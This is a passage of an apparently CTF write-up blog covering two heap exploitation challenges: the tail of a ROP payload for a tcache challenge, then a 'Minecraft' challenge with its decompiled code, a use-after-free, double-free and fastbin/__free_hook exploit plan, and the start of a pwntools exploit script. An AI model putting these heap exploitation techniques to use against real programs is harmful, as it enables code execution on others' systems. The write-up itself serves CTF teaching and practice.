-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rsi)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x15000</span>) <span style="color:#75715e"># buffer</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdx_r12)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x100</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># nbytes</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rax)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(syscall_ret) <span style="color:#75715e"># sys_write(1, heap + 0x15000, 0x100)</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;flag.txt&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>new(<span style="color:#ae81ff">8</span>,len(payload) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>,payload)
-</span></span><span style="display:flex;"><span>delete(<span style="color:#ae81ff">8</span>)
-</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
-</span></span></code></pre></div><h3 id="lfyg-conclusion-lfyg"><lf><yg> Conclusion </lf></yg></h3>
-<p>It was a very nice introduction to tcache heap exploitation, a very compact and simple binary, and a very subtle bug leading to the discovery of a powerful primitive. Even if you are a beginner, I believe you can still solve this challenge<br>
-(except for the last seccomp part)</p>
-<h2 id="lfyg-minecraft-6-solves-lfyg"><lf><yg> Minecraft (6 solves) </lf></yg></h2>
-<p>This was a difficult heap challenge, however I solved it in an unintended way, which might be easier than the official solution.<br>
-<img src="/images/minecraft/checksec.png" alt="checksec"><br>
-The binary was running with GLIBC-2.27</p>
-<h3 id="lfyg-decompile-and-hopelessly-look-for-a-plan-lfyg"><lf><yg> Decompile and hopelessly look for a plan </lf></yg></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// ebx
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> choice; <span style="color:#75715e">// [rsp+3h] [rbp-1Dh] BYREF
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> idx; <span style="color:#75715e">// [rsp+4h] [rbp-1Ch] BYREF
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v6; <span style="color:#75715e">// [rsp+8h] [rbp-18h]
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
-</span></span><span style="display:flex;"><span>  system(<span style="color:#e6db74">&#34;clear&#34;</span>);
-</span></span><span style="display:flex;"><span>  setvbuf(stdout, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0LL</span>);
-</span></span><span style="display:flex;"><span>  setvbuf(stdin, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0LL</span>);
-</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;It&#39;s Minecraft time! Your speedrun starts... now!&#34;</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span>
-</span></span><span style="display:flex;"><span>  {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
-</span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
-</span></span><span style="display:flex;"><span>      {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
-</span></span><span style="display:flex;"><span>        {
-</span></span><span style="display:flex;"><span>          puts(<span style="color:#e6db74">&#34;(p)lace a block&#34;</span>);
-</span></span><span style="display:flex;"><span>          puts(<span style="color:#e6db74">&#34;(b)reak a block&#34;</span>);
-</span></span><span style="display:flex;"><span>          puts(<span style="color:#e6db74">&#34;(r)eplace a block&#34;</span>);
-</span></span><span style="display:flex;"><span>          puts(<span style="color:#e6db74">&#34;(l)eak the end poem&#34;</span>);
-</span></span><span style="display:flex;"><span>          __isoc99_scanf(<span style="color:#e6db74">&#34;%c%*c&#34;</span>, <span style="color:#f92672">&amp;</span>choice);
-</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;p&#39;</span> )
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>          puts(<span style="color:#e6db74">&#34;idx: &#34;</span>);
-</span></span><span style="display:flex;"><span>          __isoc99_scanf(<span style="color:#e6db74">&#34;%d%*c&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
-</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">16</span> )
-</span></span><span style="display:flex;"><span>            _Exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>          puts(<span style="color:#e6db74">&#34;len: &#34;</span>);
-</span></span><span style="display:flex;"><span>          __isoc99_scanf(<span style="color:#e6db74">&#34;%ld%*c&#34;</span>, <span style="color:#f92672">&amp;</span>sizes[idx]);
-</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( sizes[idx] <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1279</span> <span style="color:#f92672">||</span> sizes[idx] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x10000</span> )
-</span></span><span style="display:flex;"><span>            _Exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>          i <span style="color:#f92672">=</span> idx;
-</span></span><span style="display:flex;"><span>          <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>mem <span style="color:#f92672">+</span> i) <span style="color:#f92672">=</span> malloc(sizes[idx]);
-</span></span><span style="display:flex;"><span>          puts(<span style="color:#e6db74">&#34;type of block: &#34;</span>);
-</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">16</span> )
-</span></span><span style="display:flex;"><span>            _Exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>          read(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">*</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>mem <span style="color:#f92672">+</span> idx), sizes[idx]);
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;b&#39;</span> )
-</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;idx: &#34;</span>);
-</span></span><span style="display:flex;"><span>        __isoc99_scanf(<span style="color:#e6db74">&#34;%d%*c&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">16</span> )
-</span></span><span style="display:flex;"><span>          _Exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>        free(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>mem <span style="color:#f92672">+</span> idx));
-</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;keep in inventory? &#34;</span>);
-</span></span><span style="display:flex;"><span>        __isoc99_scanf(<span style="color:#e6db74">&#34;%c%*c&#34;</span>, <span style="color:#f92672">&amp;</span>choice);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;y&#39;</span> <span style="color:#f92672">||</span> kept )
-</span></span><span style="display:flex;"><span>        {
-</span></span><span style="display:flex;"><span>          puts(<span style="color:#e6db74">&#34;Inventory full!&#34;</span>);
-</span></span><span style="display:flex;"><span>          <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>mem <span style="color:#f92672">+</span> idx) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
-</span></span><span style="display:flex;"><span>        {
-</span></span><span style="display:flex;"><span>          <span style="color:#f92672">++</span>kept;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>      }
-</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;r&#39;</span> )
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>      puts(<span style="color:#e6db74">&#34;Careful... you can replace a block once.&#34;</span>);
-</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( replaced )
-</span></span><span style="display:flex;"><span>        _Exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>      <span style="color:#f92672">++</span>replaced;
-</span></span><span style="display:flex;"><span>      puts(<span style="color:#e6db74">&#34;idx: &#34;</span>);
-</span></span><span style="display:flex;"><span>      __isoc99_scanf(<span style="color:#e6db74">&#34;%d%*c&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
-</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">16</span> )
-</span></span><span style="display:flex;"><span>        _Exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>      puts(<span style="color:#e6db74">&#34;type of block: &#34;</span>);
-</span></span><span style="display:flex;"><span>      read(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">*</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>mem <span style="color:#f92672">+</span> idx), sizes[idx]);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( choice <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;l&#39;</span> );
-</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Careful... you can only leak the end poem once.&#34;</span>);
-</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;idx: &#34;</span>);
-</span></span><span style="display:flex;"><span>  __isoc99_scanf(<span style="color:#e6db74">&#34;%d%*c&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">16</span> )
-</span></span><span style="display:flex;"><span>    _Exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( strchr(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>mem <span style="color:#f92672">+</span> idx), <span style="color:#e6db74">&#39;n&#39;</span>) )
-</span></span><span style="display:flex;"><span>    _Exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( strlen(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>mem <span style="color:#f92672">+</span> idx)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">9</span> )
-</span></span><span style="display:flex;"><span>    _Exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>  printf(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>mem <span style="color:#f92672">+</span> idx));
-</span></span><span style="display:flex;"><span>  _Exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>} 
-</span></span></code></pre></div><p>This was another very compact and simple binary, so I just simply skimmed through the decompilation.<br>
-We can only malloc a chunk outside of tcache range:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>__isoc99_scanf(<span style="color:#e6db74">&#34;%ld%*c&#34;</span>, <span style="color:#f92672">&amp;</span>sizes[idx]);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( sizes[idx] <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1279</span> <span style="color:#f92672">||</span> sizes[idx] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x10000</span> )
-</span></span><span style="display:flex;"><span>    _Exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> idx;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>mem <span style="color:#f92672">+</span> i) <span style="color:#f92672">=</span> malloc(sizes[idx]);
-</span></span><span style="display:flex;"><span>puts(<span style="color:#e6db74">&#34;type of block: &#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">16</span> )
-</span></span><span style="display:flex;"><span>    _Exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>read(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">*</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>mem <span style="color:#f92672">+</span> idx), sizes[idx]);
-</span></span></code></pre></div><p>Immediately we can already see an obvious bug.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>free(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>mem <span style="color:#f92672">+</span> idx));
-</span></span><span style="display:flex;"><span>puts(<span style="color:#e6db74">&#34;keep in inventory? &#34;</span>);
-</span></span><span style="display:flex;"><span>__isoc99_scanf(<span style="color:#e6db74">&#34;%c%*c&#34;</span>, <span style="color:#f92672">&amp;</span>choice);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;y&#39;</span> <span style="color:#f92672">||</span> kept )
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Inventory full!&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>mem <span style="color:#f92672">+</span> idx) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">++</span>kept;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>We have an one-time use-after-free.<br>
-We have a edit function(replace block), and we also have free function(break block).<br>
-Thus we can write into freed chunk, and also we can free a chunk twice, the first time we keep the block, the second time we cannot keep it anymore.<br>
-There is also a printf format string vulnerability:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( strchr(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>mem <span style="color:#f92672">+</span> idx), <span style="color:#e6db74">&#39;n&#39;</span>) )
-</span></span><span style="display:flex;"><span>    _Exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( strlen(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>mem <span style="color:#f92672">+</span> idx)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">9</span> )
-</span></span><span style="display:flex;"><span>    _Exit(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>printf(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>mem <span style="color:#f92672">+</span> idx));
-</span></span><span style="display:flex;"><span>_Exit(<span style="color:#ae81ff">0</span>);
-</span></span></code></pre></div><p>However it _exit right after, so we cannot use it to leak, and the n character gets filtered as well, so no write for us. <code>There is actually a way to leak using printf without exiting the binary, its the intended solution. I wont mention the technique here, but leave it for another post</code></p>
-<h3 id="lfygbrainstorming-for-an-idea-yglf"><lf><yg>Brainstorming for an idea </yg></lf></h3>
-<p>Lets summarize what we have: a UAF, a double-free, malloc in unsorted bin range, we dont have a leak, we already can call system because there is no PIE. But with those 2 powerful vulnerabilities, maybe we can develop a leakless exploit?<br>
-The binary use read to get input, thus we can do relative write, with a bit of luck we might not need a leak.<br>
-Because we can only interact with chunk in unsorted bin range, so maybe first we should perform an unsorted bin attack. Abuse this, we can write large value into global_max_fast (because main_arena address in freed unsorted bin only has a 4 bit randomization that we have to brute-force)<br>
-Address in unsorted bin:<br>
-<img src="/images/minecraft/unsorted1.png" alt="unsorted"><br>
-Address of global_max_fast:<br>
-<img src="/images/minecraft/g_max_fast.png" alt="g_max_fast"><br>
-After the unsorted bin attack:<br>
-<img src="/images/minecraft/attack.png" alt="attack"></p>
-<ul>
-<li>We have leveraged our capability, we can now interact with fastbin chunk.<br>
-Normally, we can now just perform a fastbin attack near __malloc_hook, but sadly we do not have a leak, and at the same time, we don&rsquo;t have any libc address left on the heap to do partial overwrite.</li>
-<li>We have already used our one-time UAF, and now we have to abuse the double-free vulnerability.<br>
-To move forward, there is a technique you can use after overwriting large value into global_max_fast.<br>
-<img src="/images/minecraft/fastbin.png" alt="fastbin"></li>
-<li>There is a fastbin array to store the head of the doubly-linked list of each fastbin size. Thus, it becomes obvious that when global_max_fast becomes too big, the entry for that large size will be out of bounds. <red> This will give us the ability to write heap address to outside of the fastbinY array </red></li>
-<li>There is also this piece of code in the glibc _int_malloc function:</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) (nb) <span style="color:#f92672">&lt;=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) (get_max_fast ()))
-</span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>      idx <span style="color:#f92672">=</span> fastbin_index (nb);
-</span></span><span style="display:flex;"><span>      mfastbinptr <span style="color:#f92672">*</span>fb <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>fastbin (av, idx);
-</span></span><span style="display:flex;"><span>      mchunkptr pp;
-</span></span><span style="display:flex;"><span>      victim <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>fb;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (victim <span style="color:#f92672">!=</span> NULL)
-</span></span><span style="display:flex;"><span>	{
-</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">if</span> (SINGLE_THREAD_P)
-</span></span><span style="display:flex;"><span>	    <span style="color:#f92672">*</span>fb <span style="color:#f92672">=</span> victim<span style="color:#f92672">-&gt;</span>fd;
-</span></span></code></pre></div><p>fb is the pointer to the array entry (which with large size will be out of bounds). We can see that when we malloc, the array entry will get placed with the free fastbin fd pointer.<br>
-This is typical doubly-linked list remove functionality.<br>
-=&gt; <red> If we can overwrite the fd pointer in the freed chunk, we can control what address gets written into that array entry </red><br>
-=&gt; <red> A somewhat write-what-where primitive </red> (which get limited to the range after fastbinY array only)</p>
-<h3 id="lfyg-the-pushback-lfyg"><lf><yg> The pushback </lf></yg></h3>
-<p>Immediately, we can recognize that __free_hook is in the range after fastbinY array.</p>
-<ul>
-<li>So we can just free a chunk with an appropriate size, to put heap address into __free_hook.</li>
-<li>And then somehow overwrite the fd pointer to system_plt (no PIE).</li>
-<li>Malloc again and <strong>free_hook gets replaced with system_plt<br>
-_</strong>__________________________________________________________________________</li>
-</ul>
-<p>Sadly we dont have a UAF anymore, thats the restriction of this challenge. However we still have double-free vulnerability on our hands, the plan should look like this:</p>
-<ul>
-<li>Free chunk1 to put heap address into __free_hook.</li>
-<li>Free chunk2 (to avoid double free detection)</li>
-<li>Free chunk1 again (now there are 2 chunk1 on the freebin list)</li>
-<li>Malloc to take chunk1 out, overwrite the fd pointer.</li>
-<li>Malloc to take chunk2 out.</li>
-<li>Malloc to take chunk1 out again, however this time the fd pointer has been overwritten, and we have our controlled write.<br>
-_____________________________________________________________________________</li>
-</ul>
-<p>Unfortunately this would fail, due to the fact that after step1, __free_hook will be heap address, so the second time we free, __free_hook gets called and we get segfault :(</p>
-<h3 id="lfyg-the-116-chance-to-succeed-was-too-good-to-be-true-lfyg"><lf><yg> The 1/16 chance to succeed was too good to be true </lf></yg></h3>
-<p>We have now realized we cannot just free a chunk to write into __free_hook right again. So what can we do?<br>
-We have to find a different way to overwrite the fd pointer. What if we can achieve something like this:</p>
-<ul>
-<li>Free chunk1 with appropriate size, heap address gets written into __free_hook (wont use free again)</li>
-<li>Malloc chunk2, somehow chunk2 will overwrite into chunk1 fd pointer.</li>
-<li>Malloc to take chunk1 out, and <strong>free_hook gets written with the address of our control.<br>
-=&gt; We have to figure out how to do this: <code>Malloc chunk2, somehow chunk2 will overwrite into chunk1 fd pointer.</code><br>
-Well a double-free vulnerability is already pretty powerful, we can just overwrite fd pointer to point to different things (perform a fastbin attack)<br>
-=&gt; <red> We can point it to a fake chunk near the freed chunk1, so the next malloc we can overwrite into chunk1 data </red><br>
-_</strong>__________________________________________________________________________________</li>
-</ul>
-<p>Again unfortunately no leak, so we dont know where to point to. However remember what i said earlier:</p>
-<p><em>&ldquo;We can now just perform a fastbin attack near __malloc_hook, but sadly we do not have a leak, and at the same time, we don&rsquo;t have any libc address left on the heap to do partial overwrite.&rdquo;</em></p>
-<p>But we have heap address already on the heap, specifically the fd pointer, is pointing to next chunk in the heap segment, <red> thus we can partial overwrite to point to a different chunk in the heap segment. </red><br>
-Again this partial overwrite will have 4 bit randomization (we have to partial overwrite 2 bytes, the first 12 bits are not affected by aslr)</p>
-<p>And our chance to succeed decrease even more. C&rsquo;est la vie :(</p>
-<h3 id="lfyg-the-full-exploit-plan-lfyg"><lf><yg> The full exploit plan </lf></yg></h3>
-<p>The heap layout i want to achieve:<br>
-<img src="/images/minecraft/heap_layout.png" alt="layout"></p>
-<p><red>The exploit: </red></p>
-<ul>
-<li>Free chunk 2, then use UAF to partial overwrite the bk ptr to point to global_max_fast, so global_max_fast has a large value (1/16 chance)</li>
-<li>Double free chunk 2, leverage this to again partial overwrite the fd ptr to point to another heap chunk instead, in particular our fake chunk (1/16 chance)</li>
-<li>Free chunk 3, so __free_hook now have heap address, we will not free again to avoid segfault</li>
-<li>Now when we malloc 0x510, we will get a chunk near chunk 3, thus we can overwrite the fd ptr in chunk 3 (overwrite to system plt)</li>
-<li>After that malloc 0x3950, and __free_hook wil be written with our newly put fd ptr</li>
-<li>Free chunk 4, spawn a shell
--&gt; 1/256 chance to succeed</li>
-</ul>
-<p><red>Exploit script: </red></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">place</span>(idx,sz,content):
-</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;(l)eak the end poem</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;p&#39;</span>)
-</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;idx: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(idx)<span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;len: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(sz)<span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;block: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,content)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brk</span>(idx,option):
-</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;(l)eak the end poem</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span>)
-</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;idx: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(idx)<span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;inventory? </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,option)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">replace</span>(idx,content):
-</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;(l)eak the end poem</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;r&#39;</span>)
-</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;idx: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(idx)<span style="color:#f92672">.</span>encode())
